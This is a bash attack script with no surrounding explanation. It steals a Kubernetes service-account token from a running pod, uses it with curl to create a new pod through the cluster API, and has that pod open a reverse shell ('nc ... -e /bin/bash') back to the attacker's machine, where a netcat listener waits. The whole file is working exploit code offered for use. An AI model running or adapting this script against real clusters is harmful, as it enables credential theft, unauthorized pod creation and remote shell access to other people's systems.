#!/bin/bash

set -e

K8S_HOST="https://flycatcher-k8s:6443"
PORT=4444
POD=`kubectl get pods -l=app=web -o=jsonpath='{.items..metadata.name}'`
echo "Pod: $POD"

JWT=`kubectl exec $POD -- cat /var/run/secrets/my-bound-token/token`
NUM=`echo $[ $RANDOM % 100000 + 999999 ]`
NAME="nginx-$NUM"
echo $NAME
MSG="PWNED"

IP=`ifconfig | grep -A1 en0 | grep "inet " | sed 's/inet addr://' | awk '{ print $2 }'`
echo $IP

cat << EOF > ./pod.json
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "$NAME"
    },
    "spec": {
        "containers": [
            {
                "name": "alpine",
                "image": "alpine:latest",
                "command": ["/bin/sh"],
                "args": [
                    "-c",
                    "echo $MSG && apk update && apk add bash net-tools && nc $IP $PORT -e /bin/bash && sleep 30s"
                ]
            }
        ]
    }
}
EOF

curl -k -v -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" $K8S_HOST/api/v1/namespaces/default/pods -d@pod.json  

echo """
Starting...

$ """

while true
do
    nc -lv 0.0.0.0 $PORT
done